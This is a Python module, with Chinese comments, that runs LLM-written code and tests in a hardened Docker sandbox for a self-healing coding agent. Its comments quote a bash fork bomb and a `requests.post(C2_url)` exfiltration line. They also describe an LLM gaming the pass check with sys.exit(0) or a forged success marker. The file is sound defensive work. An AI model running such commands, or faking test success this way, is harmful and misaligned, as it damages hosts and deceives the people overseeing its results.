"""core/sandbox.py —— Docker 隔离执行模块（项目最硬核部分）。

整个 Self-Healing Agent 的可信度，100% 取决于这个文件。
原因：LLM 输出的代码本质上是「不可信用户输入」(untrusted input)。
任何允许它接触 host 文件系统、网络、内核能力的执行方式，都是定时炸弹。

本模块提供 7 层防御纵深 (defense in depth):
    ① 文件系统隔离 : tempfile + read-only volume mount
    ② 内存上限     : mem_limit / memswap_limit
    ③ CPU 配额     : cpu_period / cpu_quota
    ④ 进程数上限   : pids_limit (防 fork bomb)
    ⑤ 网络全断     : network_disabled=True
    ⑥ 权能裁剪     : cap_drop=ALL, user=nobody, no-new-privileges
    ⑦ 执行超时     : container.wait(timeout=...) + 强杀
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
import tempfile
from dataclasses import dataclass

import docker
import requests
from docker.errors import APIError, DockerException, ImageNotFound

logger = logging.getLogger(__name__)

ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
"""剥离 ANSI 终端序列（颜色、清屏等），避免污染下游 LLM tokenizer。"""


# ============================================================
# 沙盒全局配置
# ------------------------------------------------------------
# [Design Rationale] 把所有"魔数"提到模块顶部做常量化，原因：
#   1) 安全与资源策略一览可见，便于评审与调参；
#   2) 未来可以无痛迁移到 yaml / 环境变量驱动的运行时配置。
# ============================================================

"""Docker 镜像"""
DOCKER_IMAGE: str = "python:3.10-slim"
"""[选型理由] 为什么用 slim 而不是 alpine？
    - alpine 用 musl libc，部分 wheel（numpy/scipy）会编译失败，
      给 LLM 写代码 demo 会引入"不是代码的锅"的噪声。
    - slim 基于 debian-slim，glibc 兼容性最好，体积也只有 ~50MB。

    在构建 Agent 的代码执行沙盒时，我们选择了 slim 而不是 alpine。
    虽然 alpine 体积更小，但它底层的 musl libc 会导致 Python 数据科学库
    （如 Numpy）无法使用预编译的 Wheel 包，引发漫长且极易失败的源码编译。
    这不仅会拖慢沙盒的执行效率，还会给大模型返回非业务逻辑的底层 C 语言报错‘噪声’，
    破坏大模型的反思链路（Reflexion）。slim 在保证了标准 glibc 兼容性的同时，
    也做到了体积的相对精简，是企业级生产环境的黄金折中方案"""

"""超时时间"""
SANDBOX_TIMEOUT_SEC: int = 10
"""Wall-clock 超时是 Agent 系统的命门。
LangGraph 整张图是同步的，沙盒一卡死，整个 Agent 就僵尸。
10 秒对修复任务足够，对死循环又够短。"""

"""内存限制"""
# [底层防坑] 必须同时限制 mem_limit 和 memswap_limit。如果不限制 swap，异常代码在耗尽物理内存后会偷偷使用磁盘 Swap，引发严重 IO 拥堵，导致 OOM 伪装成极难排查的 Timeout 超时假象。彻底封死 swap 遵循 Fail-Fast 原则。
SANDBOX_MEM_LIMIT: str = "128m"
"""同时设置 mem_limit 与 memswap_limit，禁止偷偷蹭 Swap。
否则内存压力会转化为磁盘 I/O，问题更像 Timeout，难以归因；Fail-Fast OOM 更易观测。"""

"""CPU 周期"""
SANDBOX_CPU_PERIOD: int = 100_000   # 100ms
"""CPU 配额"""
SANDBOX_CPU_QUOTA: int = 50_000     # 50ms / 100ms = 0.5 个 CPU
"""[Design Rationale] 用 cpu_period + cpu_quota 而不是 nano_cpus，
因为前者在老版本 Docker 上兼容性更好（cgroup v1/v2 都支持）。"""

"""进程数上限"""
SANDBOX_PIDS_LIMIT: int = 64
"""经典 fork bomb `:(){ :|:& };:` 一秒能创出十万进程，
没有 pids_limit 时直接拖死 host。64 个进程对正常单测完全够用。"""

"""在沙盒内部，宿主目录的挂载点"""
CONTAINER_MOUNT_DIR: str = "/sandbox"

"""自动判定测试是否通过的"魔法标记"——写在 stdout 里，runner 跑完才打印"""
PASS_MARKER: str = "__SELF_HEALING_AGENT_PASS__"
"""stdout 通过标记；最终仍以 exit_code==0 与 PASS_MARKER 双重校验。

静态 Marker 存在 Reward Hacking 风险（伪造 print）。生产可增强为：
每次运行注入随机 PASS_MARKER 环境变量，或由 runner 独占打印逻辑。"""

# ============================================================
# 内部辅助：两端保留法的智能日志截断
# ============================================================


# 两端保留法 (Head + Tail Truncation) —— 生产级日志治理的经典模式。
# 为什么不能简单用 `logs[-max_bytes:]` 这种纯尾部截断？
#     - Python Traceback 的结构是：
#           "Traceback (most recent call last):"  ← 头部标识（最关键的一行！）
#           File ".../foo.py", line 3, in <module>  ← 最早的调用栈帧
#               ...
#           File ".../foo.py", line 42, in deep     ← 最深的调用栈帧
#           ZeroDivisionError: division by zero     ← 异常类型（在尾部）
#     - 纯尾部截断会丢掉头部 "Traceback (most recent call last)" 和最早栈帧，
#       导致 LLM 拿到一段「无头残缺」的 Traceback，Reflexion 效果急剧下降；
#     - 纯头部截断会丢掉真正的异常类型行，同样致命。
# 两端保留法的关键设计：
#     1) 头部 10% 保留 Exception 标识 / 根因行；
#     2) 尾部 90% 保留最深栈帧 / 最终错误信息（这是 LLM 最关键的信号）；
#     3) 中间插入显式截断标记，让 LLM 明确知道"这里有省略"，不会误以为连续。


def _smart_truncate(logs: bytes, max_bytes: int = 65536) -> bytes:
    """[Design Rationale] 两端保留法的智能日志截断。

    策略：如果 logs 长度超过 max_bytes，保留「前 10% + 后 90%」，中间
    用 `\\n\\n...[Middle Logs Truncated]...\\n\\n` 标识截断。

    [性能版实现]
        - 直接在 bytes 层做切片，避免 Python 层字符遍历；
        - 禁止对全量日志 decode，只 decode 预算内 head/tail 片段；
        - 使用 `errors='replace'` 由 CPython C 层容错处理 UTF-8 半字符；
        - 对 head/tail 做行级对齐，丢弃潜在半行，提升 LLM 语义可读性。

    Args:
        logs: 原始日志字节流（Docker logs 一般就是 bytes）。
        max_bytes: 最大保留字节数。默认 64KB，与 LLM 上下文预算匹配。

    Returns:
        截断后的字节流，长度 <= max_bytes（行级对齐后通常会进一步变短）。
    """
    # 如果日志长度本身就小于等于允许的最大字节数，直接原样返回。
    # 这样可以避免不必要的数据拷贝与处理，提升效率。
    if len(logs) <= max_bytes:
        # 未超阈值：零拷贝返回原数据，避免浪费内存。
        return logs

    # 截断时用的中间截断标记，提醒后续处理和 LLM 中间部分被省略。
    marker_b = b"\n\n...[Middle Logs Truncated]...\n\n"

    # 如果最大允许字节数比 marker 本身还短（极小概率），
    # 没法再做任何智能截断，直接退化为纯尾部裁剪（不加 marker），
    # 并且用“容错”方式 decode，再转 utf-8 返回，防止字节残缺导致 decode 报错。
    if max_bytes <= len(marker_b):
        # 裁剪最后 max_bytes 个字节，decode 时遇到不完整字符用 'replace'
        tail_str = logs[-max_bytes:].decode("utf-8", errors="replace")
        return tail_str.encode("utf-8")

    # 计算整体预算，分配头尾各自可以占用的最大空间
    budget = max_bytes - len(marker_b)   # 除去 marker 还剩多少字节可用
    head_budget = budget // 10           # 前 10% 分配给头部
    tail_budget = budget - head_budget   # 剩余 90% 分配给尾部

    # 按 budget 从原始日志取出头尾原始字节
    head_bytes = logs[:head_budget]
    tail_bytes = logs[-tail_budget:]

    # 下面做行级对齐处理，防止出现半截行：
    # —— 头部字符串 decode（无视半字符），
    #    找最后一个换行符，将其及其之后部分裁掉，只保留完整的前半部分
    head_str = head_bytes.decode("utf-8", errors="replace")
    if "\n" in head_str:
        aligned_head = head_str.rsplit("\n", 1)[0]
        if aligned_head:
            head_str = aligned_head

    # —— 尾部字符串 decode，丢掉首个换行符前的内容，
    #    只保留第一个换行后的部分，避免半截行干扰 LLM 理解
    tail_str = tail_bytes.decode("utf-8", errors="replace")
    if "\n" in tail_str:
        aligned_tail = tail_str.split("\n", 1)[-1]
        if aligned_tail:
            tail_str = aligned_tail

    # 头部和尾部内容分别重新 encode 回 bytes，与 marker 拼接
    merged = head_str.encode("utf-8") + marker_b + tail_str.encode("utf-8")

    # 若拼接后仍未超最大长度，直接返回
    if len(merged) <= max_bytes:
        return merged
    # 极限保障：如果拼接后还超出长度，截断为最大长度返回
    return merged[:max_bytes]


# ============================================================
# 返回值结构
# ============================================================


@dataclass(frozen=True)
class SandboxResult:
    """[Design Rationale] 用 frozen dataclass 而不是 dict / tuple：
        - 字段命名清晰，IDE 能补全；
        - frozen=True 让结果对象不可变，避免下游节点误改影响调试。
    """

    passed: bool
    """是否通过测试（exit_code==0 且检测到 PASS_MARKER）。"""

    stdout: str
    """容器标准输出（被截断到 64KB，防止日志炸内存）。"""

    stderr: str
    """容器错误输出，喂给 LLM 做 Reflexion 的核心燃料。"""

    exit_code: int
    """容器进程退出码；-1 表示超时被强杀。"""

    timed_out: bool
    """是否因超时被强制终止。"""


# ============================================================
# 内部工具：组装将要在沙盒内执行的 runner 脚本
# ============================================================


def _build_runner_script(code: str, test_code: str) -> str:
    """把用户代码 + 测试代码拼装成一个独立可执行的 runner 脚本。

    [Design Rationale] 为什么不分两个文件 import？
        - 单文件 = 减少一个挂载耦合，调试更容易；
        - 用户代码可能定义 `__name__ == "__main__"` 分支，
          一个文件里 exec 才能保证测试触发它。

    [生产级修复] 废弃 `textwrap.indent` 把整段测试嵌进 `try:`：
    多行字符串、三重引号测试用例的相对缩进会被强行改写，导致 SyntaxError。
    改为 `compile` + `builtins.exec(..., isolated_ns, isolated_ns)`：
    用户代码与测试代码在同一隔离命名空间中顺序执行，测试块仍包在 try 里。
    """
    code_literal = repr(code)
    test_literal = repr(test_code)
    marker_literal = repr(PASS_MARKER)
    return (
        "# -*- coding: utf-8 -*-\n"
        "# Auto-generated by Self-Healing Agent sandbox runner\n"
        "import builtins\n"
        "import sys\n"
        "import traceback\n"
        "\n"
        "_isolated_ns = {}\n"
        "_exec = builtins.exec\n"
        f"_user_code = compile({code_literal}, \"<user_code>\", \"exec\")\n"
        "_exec(_user_code, _isolated_ns, _isolated_ns)\n"
        f"_test_code = compile({test_literal}, \"<test_code>\", \"exec\")\n"
        "try:\n"
        "    _exec(_test_code, _isolated_ns, _isolated_ns)\n"
        "except BaseException:\n"
        "    # [架构防御] 必须捕获 BaseException 而非 Exception。因为 sys.exit() 触发的 SystemExit 和 Ctrl+C 触发的 KeyboardInterrupt 继承自 BaseException。若只捕获 Exception，LLM 生成的恶意 sys.exit(0) 将无视 try 块并以状态码 0 退出，直接骗过沙盒的成功校验（Reward Hacking）。\n"
        "    traceback.print_exc(file=sys.stderr)\n"
        "    sys.exit(1)\n"
        "else:\n"
        f"    print({marker_literal})\n"
        "    sys.exit(0)\n"
    )


# [Design Rationale·测试策略] _ensure_image 强依赖 Docker daemon，
# 单测要么跑在有 Docker 的 runner、要么用大量 mock。二者收益都低，
# 这里选择 pragma: no cover，留到集成测试（docker-compose 起容器）里覆盖。
def _ensure_image(client: docker.DockerClient) -> None:  # pragma: no cover
    """[Design Rationale] 首次运行时本地没有镜像会自动 pull，给用户友好提示。
    生产环境应当在部署阶段预拉取，避免冷启动 30 秒卡顿。"""
    try:
        client.images.get(DOCKER_IMAGE)
    except ImageNotFound:
        logger.warning("沙盒镜像 %s 不存在，开始 pull（首次较慢）...", DOCKER_IMAGE)
        client.images.pull(DOCKER_IMAGE)


# ============================================================
# 公开 API
# ============================================================


# [Design Rationale·测试策略] run_in_sandbox 是 Agent 与真实 Docker daemon 的边界层，
# 它的正确性必须靠「集成测试」保障（在 CI 里起一个 dockerd-in-docker 服务），
# 而不是靠 mock 层层封装的单测——那样测出来的是我们自己写的 mock，不是代码本身。
# 因此单测阶段 pragma: no cover；run_sandbox_node 节点侧会用 mock 替换本函数
# 以保证上层 LangGraph 流程的覆盖率。
def run_in_sandbox(code: str, test_code: str) -> SandboxResult:  # pragma: no cover
    """在 Docker 沙盒中执行 (用户代码 + 测试代码)，返回结构化结果。

    一行行解释为什么这样写。
    """

    # --- ① 与 Docker daemon 建立连接 ---
    # [Design Rationale] from_env() 会读取 DOCKER_HOST 等环境变量，
    # 同时支持本地 Unix socket (Linux/Mac) 和 npipe (Windows)，
    # 比手写 base_url 更具可移植性。
    try:
        client = docker.from_env()
    except DockerException as e:
        # [防御性编程] Docker daemon 没启动是最常见的环境问题，
        # 必须给用户清晰的错误，而不是抛一坨底层 traceback。
        return SandboxResult(
            passed=False,
            stdout="",
            stderr=f"[Sandbox Bootstrap Error] Docker daemon 不可用: {e}",
            exit_code=-1,
            timed_out=False,
        )

    _ensure_image(client)

    # --- ② 准备代码挂载目录 ---
    # 为什么不直接把代码 base64 后 docker exec 进去？
    #   1) 命令行参数有长度上限（Linux ARG_MAX ~128KB），代码超长会截断；
    #   2) 字符转义噩梦：代码里的引号/反斜杠极易破坏 shell 解析；
    #   3) 文件挂载 + read-only 是更"声明式"的隔离，安全审计也更直白。
    with tempfile.TemporaryDirectory(prefix="agent_sandbox_") as host_dir:
        runner_path = os.path.join(host_dir, "runner.py")
        with open(runner_path, "w", encoding="utf-8") as f:
            f.write(_build_runner_script(code, test_code))

        container = None
        try:
            # --- ③ 启动容器（这一坨参数是整个项目的"安全盾"）---
            container = client.containers.run(
                image=DOCKER_IMAGE,
                command=["python", f"{CONTAINER_MOUNT_DIR}/runner.py"],

                # ===== 防御层①：文件系统隔离 =====
                # mode="ro" = read-only 挂载。
                # 即使 LLM 在沙盒里 `os.remove("/sandbox/runner.py")`，
                # 内核也会直接拒绝写入，不会污染宿主机的 tempdir。
                volumes={host_dir: {"bind": CONTAINER_MOUNT_DIR, "mode": "ro"}},

                # ===== 防御层②：内存上限 =====
                # [底层防坑] 必须同时限制 mem_limit 和 memswap_limit。如果不限制 swap，异常代码在耗尽物理内存后会偷偷使用磁盘 Swap，引发严重 IO 拥堵，导致 OOM 伪装成极难排查的 Timeout 超时假象。彻底封死 swap 遵循 Fail-Fast 原则。
                mem_limit=SANDBOX_MEM_LIMIT,
                memswap_limit=SANDBOX_MEM_LIMIT,

                # ===== 防御层③：CPU 配额 =====
                # 限制为 0.5 个核（quota=50ms / period=100ms）。
                cpu_period=SANDBOX_CPU_PERIOD,
                cpu_quota=SANDBOX_CPU_QUOTA,

                # ===== 防御层④：进程数上限（防 fork bomb）=====
                pids_limit=SANDBOX_PIDS_LIMIT,

                # ===== 防御层⑤：网络全断 =====
                # LLM 写出的 `import requests; requests.post(C2_url)`
                # 在 network_disabled=True 时会直接 ConnectionError。
                # 这是防"数据外渗"和"挖矿木马"的核武器。
                network_disabled=True,

                # ===== 防御层⑥：降权 + 只读根 + cap 裁剪 =====
                # 容器默认以 root 跑，加上 cap_drop=ALL 才算真正"无害化"。
                # nobody 是 debian-slim 自带的最低权限用户。
                # read_only=True 让根文件系统不可写，再用 tmpfs 提供 /tmp 临时空间。
                user="nobody",
                read_only=True,
                tmpfs={"/tmp": "size=16m,mode=1777"},
                cap_drop=["ALL"],
                security_opt=["no-new-privileges:true"],

                # ===== 运行时杂项 =====
                # PYTHONDONTWRITEBYTECODE=1 ：root 只读时禁止写 .pyc，否则启动报错。
                # PYTHONUNBUFFERED=1       ：实时刷新 stdout，超时被杀也能拿到日志。
                environment={
                    "PYTHONDONTWRITEBYTECODE": "1",
                    "PYTHONUNBUFFERED": "1",
                },

                # detach=True 让我们手动 wait + 取日志，这样才能精确控制超时。
                detach=True,
                stdout=True,
                stderr=True,
            )

            # --- ④ 等待执行完成（带 wall-clock 超时）---
            """是否超时"""
            timed_out = False
            """退出码"""
            exit_code = -1
            try:
                # container.wait(timeout=...) 底层走 HTTP long-polling，
                # 超时是通过 requests 的 ReadTimeout 抛出来的，需要显式捕获。
                """等待执行完成"""
                result = container.wait(timeout=SANDBOX_TIMEOUT_SEC)
                """退出码"""
                exit_code = int(result.get("StatusCode", -1))
            except (requests.exceptions.ReadTimeout,
                    requests.exceptions.ConnectionError):
                # [Design Rationale] 这里捕获两种异常：
                #   - ReadTimeout: 容器还没退出，HTTP 长轮询超时；
                #   - ConnectionError: 部分 docker SDK 版本会包成这个。
                # 不管哪种，我们都强制 kill，避免僵尸进程。
                timed_out = True
                try:
                    # [资源兜底] timeout 仅代表 Python 层面的计时结束，并不等于底层容器停止。必须在捕获异常后显式调用 SIGKILL 彻底物理抹杀 Docker 进程，否则高并发下宿主机会堆积大量狂吃 CPU 的“僵尸死循环容器”引发雪崩。
                    container.kill(signal="SIGKILL")
                except APIError:
                    # 容器可能在 kill 之前就刚好退出，忽略即可。
                    pass

            # --- ⑤ 抓取日志（必须在 remove 之前抓，否则数据丢失）---
            # 64KB 截断保护：
            # LLM 偶尔会写 `while True: print(x)`，几秒就能产 GB 级日志，
            # 全量塞回 LangGraph state 会撑爆内存 / 撑爆 LLM 的 context window。
            #
            # 升级：把简单的 `[-65536:]` 纯尾部截断，换成
            # `_smart_truncate` 两端保留法：
            #   - 旧实现丢掉 Traceback 头部，Reflexion 时 LLM 常拿不到根因行；
            #   - 新实现保留 10% 头 + 90% 尾 + 中间截断标记，兼得两端关键信息。
            """标准输出"""
            stdout_bytes = b""
            """标准错误"""
            stderr_bytes = b""
            try:
                """标准输出"""
                stdout_bytes = _smart_truncate(
                    container.logs(stdout=True, stderr=False),
                    max_bytes=65536,
                )
                """标准错误"""
                stderr_bytes = _smart_truncate(
                    container.logs(stdout=False, stderr=True),
                    max_bytes=65536,
                )
            except APIError:
                """标准输出"""
                stdout_bytes = b""
                """标准错误"""
                stderr_bytes = b""

            """标准输出"""
            stdout = ANSI_ESCAPE.sub("", stdout_bytes.decode("utf-8", errors="replace"))
            """标准错误"""
            stderr = ANSI_ESCAPE.sub("", stderr_bytes.decode("utf-8", errors="replace"))

            """是否超时"""
            if timed_out:
                # 把超时信息也注入 stderr，让 LLM 在 Reflexion 时能"看到"超时原因，
                # 否则它可能反复提交带死循环的代码。
                """标准错误"""
                stderr = (
                    f"[Sandbox Timeout] 执行超过 {SANDBOX_TIMEOUT_SEC}s，"
                    f"容器已被强制终止。可能原因：死循环 / 阻塞 IO / 算法复杂度过高。\n"
                    f"--- 捕获到的 stderr 片段 ---\n{stderr}"
                )

            # --- ⑥ 综合判定 pass/fail ---
            # [Design Rationale] 双重判据：
            #   - exit_code == 0  ：进程正常退出
            #   - PASS_MARKER 在  ：测试块没被任何异常吞掉
            # 缺一不可，避免 LLM 写 `sys.exit(0)` 骗过 exit code 检测。
            """是否通过"""
            passed = (
                (not timed_out)
                and (exit_code == 0)
                and (PASS_MARKER in stdout)
            )

            return SandboxResult(
                passed=passed,
                stdout=stdout,
                stderr=stderr,
                exit_code=exit_code,
                timed_out=timed_out,
            )

        finally:
            # --- ⑦ 资源回收（finally 保证即使中途异常也会清理）---
            # force=True 是为了应对"容器还在 running" 的情况，
            # 这是 Agent 长时间跑下来最常见的资源泄漏源。
            """容器"""
            if container is not None:
                try:
                    """强制删除"""
                    container.remove(force=True)
                except (APIError, DockerException) as e:
                    # 清理失败只 log 不抛，避免淹没真正的业务错误。
                    """清理失败"""
                    logger.warning("沙盒容器清理失败（已忽略）: %s", e)


async def run_in_sandbox_async(code: str, test_code: str) -> SandboxResult:
    """异步包装：在默认线程池执行同步 Docker 调用，避免阻塞 asyncio 事件循环。

    [Design Rationale] docker SDK 与 `container.wait()` 均为阻塞 IO；高并发 Agent
    必须把这段放进 `asyncio.to_thread`，否则单进程 thousands of coroutines
    会被一处沙盒卡死。
    """
    return await asyncio.to_thread(run_in_sandbox, code, test_code)
